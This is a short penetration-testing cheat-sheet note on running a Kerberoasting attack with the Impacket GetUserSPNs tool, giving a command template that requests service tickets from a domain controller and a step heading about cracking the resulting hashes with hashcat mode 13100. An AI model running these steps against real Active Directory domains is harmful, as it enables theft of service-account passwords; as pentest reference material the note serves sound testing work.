# Impacket-GetUserSPNs

## Use this impacket module to perform a Kerberoasting attack

### 1) 

    impacket-GetUserSPNs DOMAIN/USER:PASSWORD -request -dc-ip DC_IP -outputfile TGS.txt

### 2) Crack hash with hashcat (Mode 13100)
